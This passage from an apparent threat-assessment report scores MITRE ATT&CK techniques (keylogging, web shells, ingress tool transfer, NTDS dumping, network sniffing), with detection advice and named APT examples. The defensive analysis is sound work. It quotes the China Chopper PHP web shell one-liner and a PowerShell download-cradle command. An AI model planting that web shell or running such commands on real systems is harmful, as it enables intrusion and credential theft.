- Lazarus Group has used administrator credentials to gain access to restricted network segments.[[7]](https://securelist.com/lazarus-threatneedle/100803/)
- menuPass has used valid accounts including shared between Managed Service Providers and clients to move between the two environments.[[8]](https://web.archive.org/web/20220224041316/https:/www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)[[9]](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage)[[10]](https://www.justice.gov/opa/page/file/1122671/download)[[11]](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/)
- Volt Typhoon relies primarily on valid credentials for persistence.[[12]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [Input Capture: Keylogging (T1056.001)](https://attack.mitre.org/techniques/T1056/001)
#### Score: 20
#### Description:
Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)

Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:

* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.
* Reading raw keystroke data from the hardware buffer.
* Windows Registry modifications.
* Custom drivers.
* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) 
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Driver: Driver Load
- Process: OS API Execution
- Windows Registry: Windows Registry Key Modification
### Detection Suggestions:
Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`.(Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes, monitor driver installs, and look for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.
#### Examples: 
- APT28 has used tools to perform keylogging.[[1]](http://download.microsoft.com/download/4/4/C/44CDEF0E-7924-4787-A56A-16261691ACE3/Microsoft_Security_Intelligence_Report_Volume_19_English.pdf)[[2]](https://cdn.cnn.com/cnn/2018/images/07/13/gru.indictment.pdf)[[3]](https://www.trendmicro.com/en_us/research/20/l/pawn-storm-lack-of-sophistication-as-a-strategy.html)
- Lazarus Group malware KiloAlfa contains keylogging functionality.[[4]](https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)[[5]](https://web.archive.org/web/20220425194457/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Tools-Report.pdf)
- menuPass has used key loggers to steal usernames and passwords.[[6]](https://www.justice.gov/opa/page/file/1122671/download)
- Volt Typhoon has created and accessed a file named rult3uil.log on compromised domain controllers to capture keypresses and command execution.[[7]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [Exploitation for Client Execution (T1203)](https://attack.mitre.org/techniques/T1203)
#### Score: 20
#### Description:
Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.

Several types exist:

### Browser-based Exploitation

Web browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.

### Office Applications

Common office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.

### Common Third-party Applications

Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Process: Process Creation
- File: File Modification
- Application Log: Application Log Content
- Network Traffic: Network Traffic Flow
### Detection Suggestions:
Detecting software exploitation may be difficult depending on the tools available. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the browser or Office processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.
#### Examples: 
- APT28 has exploited Microsoft Office vulnerability CVE-2017-0262 for execution.[[1]](https://securelist.com/a-slice-of-2017-sofacy-activity/83930/)
- APT33 has attempted to exploit a known vulnerability in WinRAR (CVE-2018-20250), and attempted to gain remote code execution via a security bypass vulnerability (CVE-2017-11774).[[2]](https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage)[[3]](https://www.microsoft.com/security/blog/2020/06/18/inside-microsoft-threat-protection-mapping-attack-chains-from-cloud-to-endpoint/)
- APT37 has used exploits for Flash Player (CVE-2016-4117, CVE-2018-4878), Word (CVE-2017-0199), Internet Explorer (CVE-2020-1380 and CVE-2020-26411), and Microsoft Edge (CVE-2021-26411) for execution.[[4]](https://securelist.com/operation-daybreak/75100/)[[5]](https://services.google.com/fh/files/misc/apt37-reaper-the-overlooked-north-korean-actor.pdf)[[6]](https://blog.talosintelligence.com/2018/01/korea-in-crosshairs.html)[[7]](https://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/)
- Lazarus Group has exploited Adobe Flash vulnerability CVE-2018-4878 for execution.[[8]](https://securingtomorrow.mcafee.com/mcafee-labs/hidden-cobra-targets-turkish-financial-sector-new-bankshot-implant/)
### [Server Software Component: Web Shell (T1505.003)](https://attack.mitre.org/techniques/T1505/003)
#### Score: 20
#### Description:
Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)

In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Application Log: Application Log Content
- Process: Process Creation
- File: File Creation
- Network Traffic: Network Traffic Content
- Network Traffic: Network Traffic Flow
- File: File Modification
### Detection Suggestions:
Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013) 

<code>&lt;?php @eval($_POST['password']);&gt;</code>

Nevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as spawning cmd.exe or accessing files that are not in the Web directory.(Citation: NSA Cyber Mitigating Web Shells)

File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script.(Citation: NSA Cyber Mitigating Web Shells)

Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)
#### Examples: 
- APT28 has used a modified and obfuscated version of the reGeorg web shell to maintain persistence on a target's Outlook Web Access (OWA) server.[[1]](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)
- Volt Typhoon has used webshells, including ones named AuditReport.jspx and iisstart.aspx, in compromised environments.[[2]](https://www.secureworks.com/blog/chinese-cyberespionage-group-bronze-silhouette-targets-us-government-and-defense-organizations)
### [Ingress Tool Transfer (T1105)](https://attack.mitre.org/techniques/T1105)
#### Score: 20
#### Description:
Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). 

On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023)

Adversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms)

Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- File: File Creation
- Network Traffic: Network Traffic Content
- Network Traffic: Network Traffic Flow
- Command: Command Execution
- Network Traffic: Network Connection Creation
### Detection Suggestions:
Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as [ftp](https://attack.mitre.org/software/S0095), that does not normally occur may also be suspicious.

Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Specifically, for the finger utility on Windows and Linux systems, monitor command line or terminal execution for the finger command. Monitor network activity for TCP port 79, which is used by the finger utility, and Windows <code>netsh interface portproxy</code> modifications to well-known ports such as 80 and 443. Furthermore, monitor file system for the download/creation and execution of suspicious files, which may indicate adversary-downloaded payloads. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)
#### Examples: 
- APT28 has downloaded additional files, including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant.[[1]](https://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender_In-depth_analysis_of_APT28%E2%80%93The_Political_Cyber-Espionage.pdf)[[2]](https://pan-unit42.github.io/playbook_viewer/)[[3]](https://www.accenture.com/t20181129T203820Z__w__/us-en/_acnmedia/PDF-90/Accenture-snakemackerel-delivers-zekapab-malware.pdf#zoom=50)[[4]](https://www.trendmicro.com/en_us/research/20/l/pawn-storm-lack-of-sophistication-as-a-strategy.html)[[5]](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)
- APT33 has downloaded additional files and programs from its C2 server.[[6]](https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage)[[7]](https://www.microsoft.com/security/blog/2020/06/18/inside-microsoft-threat-protection-mapping-attack-chains-from-cloud-to-endpoint/)
- APT37 has downloaded second stage malware from compromised websites.[[8]](https://services.google.com/fh/files/misc/apt37-reaper-the-overlooked-north-korean-actor.pdf)[[9]](https://securelist.com/scarcruft-continues-to-evolve-introduces-bluetooth-harvester/90729/)[[10]](https://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/)[[11]](https://www.volexity.com/blog/2021/08/24/north-korean-bluelight-special-inkysquid-deploys-rokrat/)
- Lazarus Group has downloaded files, malware, and tools from its C2 onto a compromised host.[[12]](https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)[[13]](https://web.archive.org/web/20160303200515/https:/operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf)[[14]](https://web.archive.org/web/20190508165631/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Loaders-Installers-and-Uninstallers-Report.pdf)[[15]](https://www.sentinelone.com/blog/four-distinct-families-of-lazarus-malware-target-apples-macos-platform/)[[16]](https://blog.trendmicro.com/trendlabs-security-intelligence/new-macos-dacls-rat-backdoor-show-lazarus-multi-platform-attack-capability/)[[17]](https://securelist.com/lazarus-threatneedle/100803/)[[18]](https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers/)[[19]](https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/)[[20]](https://blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns)[[21]](https://x.com/ESETresearch/status/1458438155149922312)
- menuPass has installed updates and new malware on victims.[[22]](https://web.archive.org/web/20220224041316/https:/www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)[[23]](https://www.justice.gov/opa/page/file/1122671/download)
- Volt Typhoon has downloaded an outdated version of comsvcs.dll to a compromised domain controller in a non-standard folder.[[24]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [Screen Capture (T1113)](https://attack.mitre.org/techniques/T1113)
#### Score: 15
#### Description:
Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)

#### Raleigh Space Systems Analysis: 
### Data Sources:
- Command: Command Execution
- Process: OS API Execution
### Detection Suggestions:
Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.
#### Examples: 
- APT28 has used tools to take screenshots from victims.[[1]](http://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-part-2.pdf)[[2]](https://researchcenter.paloaltonetworks.com/2017/02/unit42-xagentosx-sofacys-xagent-macos-tool/)[[3]](https://cdn.cnn.com/cnn/2018/images/07/13/gru.indictment.pdf)[[4]](https://www.secureworks.com/research/iron-twilight-supports-active-measures)
- Volt Typhoon has obtained a screenshot of the victim's system using the gdi32.dll and gdiplus.dll libraries.[[5]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [OS Credential Dumping: NTDS (T1003.003)](https://attack.mitre.org/techniques/T1003/003)
#### Score: 15
#### Description:
Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\NTDS\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)

In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015)

The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.

* Volume Shadow Copy
* secretsdump.py
* Using the in-built Windows tool, ntdsutil.exe
* Invoke-NinjaCopy

#### Raleigh Space Systems Analysis: 
### Data Sources:
- Command: Command Execution
- File: File Access
### Detection Suggestions:
Monitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit.
#### Examples: 
- APT28 has used the ntdsutil.exe utility to export the Active Directory database for credential access.[[1]](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)
- menuPass has used Ntdsutil to dump credentials.[[2]](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage)
- Volt Typhoon has used ntds.util to create domain controller installation media containing usernames and password hashes.[[3]](https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/)[[4]](https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF)[[5]](https://www.secureworks.com/blog/chinese-cyberespionage-group-bronze-silhouette-targets-us-government-and-defense-organizations)[[6]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [Email Collection: Remote Email Collection (T1114.002)](https://attack.mitre.org/techniques/T1114/002)
#### Score: 15
#### Description:
Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Application Log: Application Log Content
- Logon Session: Logon Session Creation
- Command: Command Execution
- Network Traffic: Network Connection Creation
### Detection Suggestions:
Monitor for unusual login activity from unknown or abnormal locations, especially for privileged accounts (ex: Exchange administrator account).
#### Examples: 
- APT28 has collected emails from victim Microsoft Exchange servers.[[1]](https://cdn.cnn.com/cnn/2018/images/07/13/gru.indictment.pdf)[[2]](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)
### [Data from Removable Media (T1025)](https://attack.mitre.org/techniques/T1025)
#### Score: 15
#### Description:
Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. 

Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Command: Command Execution
- File: File Access
### Detection Suggestions:
Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
#### Examples: 
- An APT28 backdoor may collect the entire contents of an inserted USB device.[[1]](http://download.microsoft.com/download/4/4/C/44CDEF0E-7924-4787-A56A-16261691ACE3/Microsoft_Security_Intelligence_Report_Volume_19_English.pdf)
### [Network Sniffing (T1040)](https://attack.mitre.org/techniques/T1040)
#### Score: 15
#### Description:
Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

Network sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.

In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)

On network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Command: Command Execution
- Process: Process Creation
### Detection Suggestions:
Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.

In cloud-based environments, monitor for the creation of new traffic mirrors or modification of existing traffic mirrors. For network infrastructure devices, collect AAA logging to monitor for the capture of network traffic.
#### Examples: 
- APT28 deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials.[[1]](https://web.archive.org/web/20151022204649/https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf)[[2]](https://web.archive.org/web/20171202185937/https://www.fireeye.com/blog/threat-research/2017/08/apt28-targets-hospitality-sector.html) APT28 close-access teams have used Wi-Fi pineapples to intercept Wi-Fi signals and user credentials.[[3]](https://www.justice.gov/opa/page/file/1098481/download)
- APT33 has used SniffPass to collect credentials by sniffing network traffic.[[4]](https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage)
- Salt Typhoon has used a variety of tools and techniques to capture packet data between network interfaces.[[5]](https://blog.talosintelligence.com/salt-typhoon-analysis/)
### [Peripheral Device Discovery (T1120)](https://attack.mitre.org/techniques/T1120)
#### Score: 15
#### Description:
Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Process: OS API Execution
- Process: Process Creation
- Command: Command Execution
### Detection Suggestions:
System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
#### Examples: 
- APT28 uses a module to receive a notification every time a USB mass storage device is inserted into a victim.[[1]](http://download.microsoft.com/download/4/4/C/44CDEF0E-7924-4787-A56A-16261691ACE3/Microsoft_Security_Intelligence_Report_Volume_19_English.pdf)
- APT37 has a Bluetooth device harvester, which uses Windows Bluetooth APIs to find information on connected Bluetooth devices. [[2]](https://securelist.com/scarcruft-continues-to-evolve-introduces-bluetooth-harvester/90729/)
- Volt Typhoon has obtained victim's screen dimension and display device information.[[3]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [Impair Defenses: Disable or Modify System Firewall (T1562.004)](https://attack.mitre.org/techniques/T1562/004)
#### Score: 15
#### Description:
Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.

Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).(Citation: change_rdp_port_conti)

Adversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds.(Citation: Huntress BlackCat) Settings related to enabling abuse of various [Remote Services](https://attack.mitre.org/techniques/T1021) may also indirectly modify firewall rules.

In ESXi, firewall rules may be modified directly via the esxcli command line interface (e.g., via `esxcli network firewall set`) or via the vCenter user interface.(Citation: Trellix Rnasomhouse 2024)(Citation: Broadcom ESXi Firewall)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Firewall: Firewall Rule Modification
- Windows Registry: Windows Registry Key Modification
- Command: Command Execution
- Firewall: Firewall Disable
### Detection Suggestions:
Monitor processes and command-line arguments to see if firewalls are disabled or modified. Monitor Registry edits to keys that manage firewalls.
#### Examples: 
- Various Lazarus Group malware modifies the Windows firewall to allow incoming connections or disable it entirely using netsh. [[1]](https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)[[2]](https://web.archive.org/web/20190508165631/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Loaders-Installers-and-Uninstallers-Report.pdf)[[3]](https://web.archive.org/web/20220425194457/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Tools-Report.pdf)
- Salt Typhoon has made changes to the Access Control List (ACL) and loopback interface address on compromised devices.[[4]](https://blog.talosintelligence.com/salt-typhoon-analysis/)
### [Exploit Public-Facing Application (T1190)](https://attack.mitre.org/techniques/T1190)
#### Score: 15
#### Description:
Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.

Exploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) On ESXi infrastructure, adversaries may exploit exposed OpenSLP services; they may alternatively exploit exposed VMware vCenter servers.(Citation: Recorded Future ESXiArgs Ransomware 2023)(Citation: Ars Technica VMWare Code Execution Vulnerability 2021) Depending on the flaw being exploited, this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).

If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005)), exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.

Adversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)

For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Network Traffic: Network Traffic Content
- Application Log: Application Log Content
### Detection Suggestions:
Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.
#### Examples: 
- APT28 has used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144, to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL injection attacks against external websites.[[1]](https://www.justice.gov/opa/page/file/1098481/download)[[2]](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)
- menuPass has leveraged vulnerabilities in Pulse Secure VPNs to hijack sessions.[[3]](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/)
- Salt Typhoon has exploited CVE-2018-0171 in the Smart Install feature of Cisco IOS and Cisco IOS XE software for initial access.[[4]](https://blog.talosintelligence.com/salt-typhoon-analysis/)
